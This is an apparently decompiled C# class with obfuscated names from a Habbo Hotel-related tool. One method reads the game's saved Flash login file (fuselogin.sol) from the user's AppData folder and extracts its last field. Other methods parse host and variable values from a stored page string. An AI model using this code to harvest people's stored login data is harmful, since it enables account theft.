using System;
using System.IO;

// Token: 0x0200001E RID: 30
internal class Class6
{
	// Token: 0x060000D7 RID: 215 RVA: 0x00002E4C File Offset: 0x0000104C
	public static void smethod_0(string string_2)
	{
		Class6.string_1 = string_2;
	}

	// Token: 0x060000D8 RID: 216 RVA: 0x0000D77C File Offset: 0x0000B97C
	public static void smethod_1()
	{
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Macromedia\\Flash Player\\#SharedObjects";
			string[] directories = Directory.GetDirectories(path);
			path = directories[0] + "\\habbo.hs.llnwd.net\\fuselogin.sol";
			StreamReader streamReader = new StreamReader(path);
			string text = streamReader.ReadToEnd();
			streamReader.Close();
			string[] array = text.Split(new char[]
			{
				'\u0019'
			});
			Class6.string_0 = array[text.Split(new char[]
			{
				'\u0019'
			}).Length - 1];
		}
		catch
		{
			Class6.string_0 = "## NOT FOUND ##";
		}
	}

	// Token: 0x17000001 RID: 1
	// (get) Token: 0x060000D9 RID: 217 RVA: 0x00002E54 File Offset: 0x00001054
	public static bool Boolean_0
	{
		get
		{
			return Class6.string_1.Contains("connection.info.host");
		}
	}

	// Token: 0x060000DA RID: 218 RVA: 0x0000D820 File Offset: 0x0000BA20
	private static string smethod_2(string string_2, int int_0, int int_1)
	{
		if (int_0 < 0)
		{
			int_0 = string_2.Length + int_0;
		}
		return string_2.Substring(int_0, int_1);
	}

	// Token: 0x060000DB RID: 219 RVA: 0x0000D84C File Offset: 0x0000BA4C
	public static object smethod_3(string string_2, bool bool_0 = false)
	{
		string text = Class6.string_1.Substring(Class6.string_1.IndexOf("\"" + string_2 + "\" : \"") + ("\"" + string_2 + "\" : \"").Length);
		text = text.Split(new char[]
		{
			'"'
		})[0];
		object result;
		if (bool_0)
		{
			result = Convert.ToInt32(text.Split(new char[]
			{
				','
			})[0]);
		}
		else
		{
			result = text;
		}
		return result;
	}

	// Token: 0x060000DC RID: 220 RVA: 0x0000D8DC File Offset: 0x0000BADC
	public static string smethod_4(string string_2)
	{
		string text = Class6.string_1.Substring(Class6.string_1.IndexOf("var " + string_2 + " = \"") + ("var " + string_2 + " = \"").Length);
		return text.Split(new char[]
		{
			'"'
		})[0];
	}

	// Token: 0x040000CC RID: 204
	public static string string_0 = "";

	// Token: 0x040000CD RID: 205
	public static string string_1;
}
